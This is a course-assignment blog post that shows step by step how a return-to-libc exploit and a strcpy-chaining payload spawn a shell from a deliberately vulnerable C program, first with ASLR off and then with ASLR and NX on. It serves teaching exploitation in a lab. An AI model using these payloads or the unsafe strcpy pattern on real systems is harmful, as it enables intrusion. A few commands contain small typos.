---
layout:       post
title:        "Defeating NX: The Return-to-libc Method"
category:     "Software Security"
tags:         software-security aslr nx cse523-assignment
permalink:    /posts/ret2libc
---

In "[Defeating ASLR: The Return-to-pop Method]({{ site.baseurl }}/posts/ret2pop)", I constructed a payload that used the <code>ret</code> and <code>pop-ret</code> instructions to inject shellcode into our vulnerable program with **ASLR**{: style="color: red"} enabled but non-executable stack (hereinafter "**NX**{: style="color: red"}") disabled. The payload worked just as expected because we knew that the memory space between <code>ans_buf</code> and the address we were returning to is larger than our shellcode. What if the memory space is not large enough? More importantly, what if we do not have a shellcode at our disposal? In this post, I would like to describe an exploitation technique called "**return-to-libc**{: style="color: red"}", which makes use of existing code ("libc" is used by convention as a shorthand for the "**standard C library**{: style="color: red"}") to spawn a shell. The documentation is organized into two parts: for the first part, the ASLR protection is turned off; and for the second part, both ASLR and NX are enabled.

<!-- excerpt-end -->

## Table of Contents
{:.no_toc}
* TOC 
{:toc}

## Part I

Let's first disable ASLR:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

The vulnerable program contains the following code:
```c
/* ans_check.c */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_answer(char *ans) {

    int ans_flag = 0;
    char ans_buf[38];

    strcpy(ans_buf, ans);

    if (strcmp(ans_buf, "forty-two") == 0)
        ans_flag = 1;
    
    return ans_flag;

}

int main(int argc, char *argv[]) {

    if (argc < 2) {
        printf("Usage: %s <answer>\n", argv[0]);
        exit(0);
    }
    if (check_answer(argv[1])) {
        printf("Right answer!\n");
    } else {
        printf("Wrong answer!\n");
    }

    printf("About to exit!\n");
    fflush(stdout);

    system("/bin/date");
    fflush(stdout);

}
```

Compile <code>ans_check.c</code> with the <code>-fno-stack-protector</code> option to disable stack canaries but with NX enabled, and run the program:
```bash
$ touch ans_check.c
$ vim ans_check.c
$ gcc -g -m32 -no-pie -fno-stack-protector ans_check.c -o ans_check
$ ./ans_check forty-one
Wrong answer!
About to exit!
Thu Oct  6 11:27:14 EDT 2022
```

The payload for the return-to-libc exploit should have the following structure:
<p id="console">PADDING | &system() | &exit_path | &cmd_string</p>
Ignoring the padding, the first two values are addresses of code. The third value is the address of a properly terminated string containing the same of the program that we wish to execute. In our examples, we will use "<code>/bin/bash</code>". The amount of <code>PADDING</code> must be such that the <code>&system()</code> value overwrites the return address on the stack.

### Addresses We Need

Let's find out the address of the <code>system()</code> standard C library function:
```bash
$ objdump -D ans_check7 | grep system
08049110 <system@plt>:
 8049363:       e8 a8 fd ff ff          call   8049110 <system@plt>
```
We shall use the address <code>0x08049110</code> for <code>&system()</code>.

Find an address to serve as the <code>&exit_path</code>:
```bash
$ objdump -D ans_check7 | grep -A 30 \<main\>
080492ae <main>:
 ...
 80492ee:       6a 00                   push   $0x0
 80492f0:       e8 2b fe ff ff          call   8049120 <exit@plt>
 ...
 8049301:       e8 50 ff ff ff          call   8049256 <check_answer>
 8049306:       83 c4 10                add    $0x10,%esp
 ...
```
We shall use the address <code>0x080492ee</code> for <code>&exit(0)</code>. Additionally, it is shown above that the <code>check_answer()</code> function returns to the address <code>0x08049306</code>.

To find our input string "<code>/bin/bash</code>", the <code>find_var.c</code> program may be used:
```c
/* find_var.c */
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char *argv[])
{
    if (!argv[1])
        exit(1);
    printf("%p\n", getenv(argv[1]));
    return 0;
}
```
Or, we can also use <code>gdb</code>:
```console
gdb-peda$ x/20s 0xffffd7e2
0xffffd7e2:     "forty-one"
0xffffd7ec:     "SHELL=/bin/bash"
0xffffd7fc:     "SUDO_GID=1000"
0xffffd80a:     "SUDO_COMMAND=/usr/bin/su seed"
0xffffd828:     "SUDO_USER=ubuntu"
0xffffd839:     "PWD=/home/seed/Documents/cse523s/return2libc"
0xffffd866:     "LOGNAME=seed"
0xffffd873:     "_=/usr/bin/gdb"
0xffffd882:     "LINES=21"
0xffffd88b:     "HOME=/home/seed"
0xffffd89b:     "LANG=C.UTF-8"
...
```
The above results show that the string starts at <code>0xffffd7ec</code>. Nevertheless, running <code>find_var.c</code>, I got the output <code>0xffffd832</code>. If we type <code>unset environment LINES</code> and <code>unset environment COLUMNS</code> in <code>gdb</code>, the two addresses should be identical.

### Assemble the Payload

We are now ready to construct our payload using the addresses we just gathered. First, run <code>echo &dollar;&dollar;</code>:
```bash
$ echo $$
2366
```

I then tried the following input string:
```bash
$ ./ans_check7 $(perl -e 'print "\x90"x2, "\x10\x91\x04\x08"x19, "\xee\x92\x04\x08", "\x32\xd8\xff\xff"')
```
which produces:
```console
sh: 1: <???%>: not found
sh: 1: <???%>: not found
sh: 1: <???%>: not found
sh: 1: <???%>: not found
sh: 1: j: not found
```
Note that the leading two bytes of NOPS in our payload are for four-byte alignment requirement, given that <code>ans_buf</code> has a size of $$38$$ bytes. The output indicates that <code>&system()</code> does overwrite the return address but the <code>SHELL</code> variable is wrongly positioned. I kept decreasing the value of repeated <code>&system()</code> until:
```bash
$ ./ans_check7 $(perl -e 'print "\x90"x2, "\x10\x91\x04\x08"x14, "\xee\x92\x04\x08", "\x32\xd8\xff\xff"')
sh: 1: /bash: not found
```
This result indicates that the <code>SHELL</code> variable is correctly positioned but the address I provided is probably off by a few bytes. If I modify the byte stream of <code>\x32\xd8\xff\xff</code> to <code>\x2e\xd8\xff\xff</code>:
```bash
$ ./ans_check7 $(perl -e 'print ""\x90"x2, "\x10\x91\x04\x08"x14, "\xee\x92\x04\x08", "\x2e\xd8\xff\xff"')
$ echo $$
3641
```
The shell is spawned successfully. Alternatively, this command also works:
```bash
$ ./ans_check7 $(perl -e 'print "\x90"x54, "\x10\x91\x04\x08", "\xee\x92\x04\x08", "\x2e\xd8\xff\xff"')
```

## Part II

Ensure that ASLR is turned on:
```bash
$ cat /proc/sys/kernel/randomize_va_space
2
```

We can use the return-to-libc method to construct our target string at an address of our choosing, and then provide this address. In particular, we can construct a build-string payload with the following organization:
<p id="console">
&strcpy@plt | &pop-pop-ret | str_loc_1 | src_byte_addr_1 |<br>
&strcpy@plt | &pop-pop-ret | str_loc_2 | src_byte_addr_2 |<br>
...<br>
&strcpy@plt | &pop-pop-ret | str_loc_n | src_byte_addr_n |
</p>
where:
- <code>&strcpy@plt</code> is the address of the <code>strcpy</code> libc function, which will be used to create our desired string by copying it one character at a time;
- <code>&pop-pop-ret</code> is the address of a <code>pop-pop-ret</code> instruction sequence in our binary;
- <code>str_loc_i</code>'s are our chosen destination string addresses;
- <code>src_byte_addr_i</code> is the address that holds the byte representation of the <i>i</i>th character in our target string;
- <code>&strcpy@plt</code> on the first line is positioned within the payload to overwrite the return address on the stack.

If we inject the above instructions properly onto the stack, our vulnerable program will return to the first <code>&strcpy@plt</code> instead of its original return address. And what will happen? The addresses <code>str_loc_1</code> and <code>src_byte_addr_1</code> are arguments for the <code>strcpy</code> libc function. The character stored at <code>src_byte_addr_1</code> will be copied into <code>str_loc_1</code>. The <code>strcpy</code> function will subsequently return to the first <code>&pop-pop-ret</code> sequence, which pops <code>str_loc_1</code> and <code>src_byte_addr_1</code> off the stack and pushes the next instruction (the second <code>&strcpy@plt</code>) onto the stack. In this way, our <i>n</i> <code>strcpy</code> functions are chained together to create an <i>n</i>-byte string starting at <code>str_loc_1</code>. The new payload we are developing is to have the following structure:
<p id="console">PADDING | build-string-payload | &system() | &exit_path | &cmd_string</p>

We can use the same method shown in [Part I](https://xyxj1024.github.io/posts/ret2libc#part-i) to obtain the addresses of <code>system()</code>, <code>exit(0)</code>, <code>strcpy()</code>, and <code>pop-pop-ret</code>. We will next choose an address to serve as our string destination. Our chosen address needs to be stable, readable, and writable, and capable of being safely overwritten. In our example, we will consider the <code>.bss</code> section of the address space. We can find this address with the <code>readelf</code> utility. Execute the following command:
```bash
$ readelf -S ans_check
There are 36 section headers, starting at offset 0x41f8:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        080481b4 0001b4 000013 00   A  0   0  1
  [ 2] .note.gnu.build-i NOTE            080481c8 0001c8 000024 00   A  0   0  4
  [ 3] .note.gnu.propert NOTE            080481ec 0001ec 00001c 00   A  0   0  4
  [ 4] .note.ABI-tag     NOTE            08048208 000208 000020 00   A  0   0  4
  [ 5] .gnu.hash         GNU_HASH        08048228 000228 000020 04   A  6   0  4
  [ 6] .dynsym           DYNSYM          08048248 000248 0000c0 10   A  7   1  4
  [ 7] .dynstr           STRTAB          08048308 000308 000079 00   A  0   0  1
  [ 8] .gnu.version      VERSYM          08048382 000382 000018 02   A  6   0  2
  [ 9] .gnu.version_r    VERNEED         0804839c 00039c 000020 00   A  7   1  4
  [10] .rel.dyn          REL             080483bc 0003bc 000010 08   A  6   0  4
  [11] .rel.plt          REL             080483cc 0003cc 000040 08  AI  6  24  4
  [12] .init             PROGBITS        08049000 001000 000024 00  AX  0   0  4
  [13] .plt              PROGBITS        08049030 001030 000090 04  AX  0   0 16
  [14] .plt.sec          PROGBITS        080490c0 0010c0 000080 10  AX  0   0 16
  [15] .text             PROGBITS        08049140 001140 0002c9 00  AX  0   0 16
  [16] .fini             PROGBITS        0804940c 00140c 000018 00  AX  0   0  4
  [17] .rodata           PROGBITS        0804a000 002000 00005b 00   A  0   0  4
  [18] .eh_frame_hdr     PROGBITS        0804a05c 00205c 000054 00   A  0   0  4
  [19] .eh_frame         PROGBITS        0804a0b0 0020b0 000148 00   A  0   0  4
  [20] .init_array       INIT_ARRAY      0804bf08 002f08 000004 04  WA  0   0  4
  [21] .fini_array       FINI_ARRAY      0804bf0c 002f0c 000004 04  WA  0   0  4
  [22] .dynamic          DYNAMIC         0804bf10 002f10 0000e8 08  WA  7   0  4
  [23] .got              PROGBITS        0804bff8 002ff8 000008 04  WA  0   0  4
  [24] .got.plt          PROGBITS        0804c000 003000 00002c 04  WA  0   0  4
  [25] .data             PROGBITS        0804c02c 00302c 000008 00  WA  0   0  4
  [26] .bss              NOBITS          0804c034 003034 000004 00  WA  0   0  1
  [27] .comment          PROGBITS        00000000 003034 00002b 01  MS  0   0  1
  [28] .debug_aranges    PROGBITS        00000000 00305f 000020 00      0   0  1
  [29] .debug_info       PROGBITS        00000000 00307f 000388 00      0   0  1
  [30] .debug_abbrev     PROGBITS        00000000 003407 00010a 00      0   0  1
  [31] .debug_line       PROGBITS        00000000 003511 000129 00      0   0  1
  [32] .debug_str        PROGBITS        00000000 00363a 0002ea 01  MS  0   0  1
  [33] .symtab           SYMTAB          00000000 003924 0004f0 10     34  50  4
  [34] .strtab           STRTAB          00000000 003e14 000286 00      0   0  1
  [35] .shstrtab         STRTAB          00000000 00409a 00015d 00      0   0  1
```
The <code>.bss</code> section starts at <code>0x0804c034</code> with flags <code>W</code> (write) and <code>A</code> (alloc). However, rather than using that exact address as our string destination address, we will choose the next-highest address that ends in <code>01</code> to avoid the null terminator. Here, we shall use the address <code>0x0804c041</code>, i.e. <code>str_loc_1 = 0x0804c041</code>.

### Find the Characters

Finally, we need to assemble the addresses of the characters that will be used to create our string. Use the command:
```bash
$ readelf -x i ans_check
```
to iterate through the sections, where <i>i</i> should be replaced with section numbers. I dumped the read-only data section:
```bash
$ readelf -x 17 ans_check

Hex dump of section '.rodata':
  0x0804a000 03000000 01000200 666f7274 792d7477 ........forty-tw
  0x0804a010 6f005573 6167653a 20257320 3c616e73 o.Usage: %s <ans
  0x0804a020 7765723e 0a005269 67687420 616e7377 wer>..Right answ
  0x0804a030 65722100 57726f6e 6720616e 73776572 er!.Wrong answer
  0x0804a040 21004162 6f757420 746f2065 78697421 !.About to exit!
  0x0804a050 002f6269 6e2f6461 746500            ./bin/date.
```

Below are the addresses I chose:

|---
| **Character** | **Hex Representation** | **Payload Tag** | **Address**
|:-|:-:|:-|:-|
| <code>/</code> | <code>2f</code> | <code>src_byte_addr_1</code>, <code>src_byte_addr_5</code> | <code>0x0804a051</code>
| <code>b</code> | <code>62</code> | <code>src_byte_addr_2</code>, <code>src_byte_addr_6</code> | <code>0x0804a052</code>
| <code>i</code> | <code>69</code> | <code>src_byte_addr_3</code> | <code>0x0804a053</code>
| <code>n</code> | <code>6e</code> | <code>src_byte_addr_4</code> | <code>0x0804a054</code>
| <code>a</code> | <code>61</code> | <code>src_byte_addr_7</code> | <code>0x0804a057</code>
| <code>s</code> | <code>73</code> | <code>src_byte_addr_8</code> | <code>0x0804a013</code>
| <code>h</code> | <code>68</code> | <code>src_byte_addr_9</code> | <code>0x0804a029</code>
| <code>null_terminator</code> | <code>00</code> | <code>src_byte_addr_10</code> | <code>0x0804a050</code>

### Assemble the Payload

Our constructed build-string payload may look like this:
<p id="console">
\xf0\x90\x04\x08 | \xf2\x93\x04\x08 | \x41\xc0\x04\x08 | \x51\xa0\x04\x08 |<br>
\xf0\x90\x04\x08 | \xf2\x93\x04\x08 | \x42\xc0\x04\x08 | \x52\xa0\x04\x08 |<br>
\xf0\x90\x04\x08 | \xf2\x93\x04\x08 | \x43\xc0\x04\x08 | \x53\xa0\x04\x08 |<br>
\xf0\x90\x04\x08 | \xf2\x93\x04\x08 | \x44\xc0\x04\x08 | \x54\xa0\x04\x08 |<br>
\xf0\x90\x04\x08 | \xf2\x93\x04\x08 | \x45\xc0\x04\x08 | \x51\xa0\x04\x08 |<br>
\xf0\x90\x04\x08 | \xf2\x93\x04\x08 | \x46\xc0\x04\x08 | \x52\xa0\x04\x08 |<br>
\xf0\x90\x04\x08 | \xf2\x93\x04\x08 | \x47\xc0\x04\x08 | \x57\xa0\x04\x08 |<br>
\xf0\x90\x04\x08 | \xf2\x93\x04\x08 | \x48\xc0\x04\x08 | \x13\xa0\x04\x08 |<br>
\xf0\x90\x04\x08 | \xf2\x93\x04\x08 | \x49\xc0\x04\x08 | \x29\xa0\x04\x08 |<br>
\xf0\x90\x04\x08 | \xf2\x93\x04\x08 | \x4a\xc0\x04\x08 | \x50\xa0\x04\x08
</p>

Successfully obtained the shell:
```bash
$ echo $$
1950
$ ./ans_check7 $(perl -e 'print
"\x90"x2, "\x10\x91\x04\x08"x13,
"\xf0\x90\x04\x08\xf2\x93\x04\x08\x41\xc0\x04\x08\x51\xa0\x04\x08",
"\xf0\x90\x04\x08\xf2\x93\x04\x08\x42\xc0\x04\x08\x52\xa0\x04\x08",
"\xf0\x90\x04\x08\xf2\x93\x04\x08\x43\xc0\x04\x08\x53\xa0\x04\x08",
"\xf0\x90\x04\x08\xf2\x93\x04\x08\x44\xc0\x04\x08\x54\xa0\x04\x08",
"\xf0\x90\x04\x08\xf2\x93\x04\x08\x45\xc0\x04\x08\x51\xa0\x04\x08",
"\xf0\x90\x04\x08\xf2\x93\x04\x08\x46\xc0\x04\x08\x52\xa0\x04\x08",
"\xf0\x90\x04\x08\xf2\x93\x04\x08\x47\xc0\x04\x08\x57\xa0\x04\x08",
"\xf0\x90\x04\x08\xf2\x93\x04\x08\x48\xc0\x04\x08\x13\xa0\x04\x08",
"\xf0\x90\x04\x08\xf2\x93\x04\x08\x49\xc0\x04\x08\x29\xa0\x04\x08",
"\xf0\x90\x04\x08\xf2\x93\x04\x08\x4a\xc0\x04\x08\x50\xa0\x04\x08",
"\x10\x91\x04\x08", "\xee\x92\x04\x08", "\x41\xc0\x04\x08"')
$ echo $$
1962
```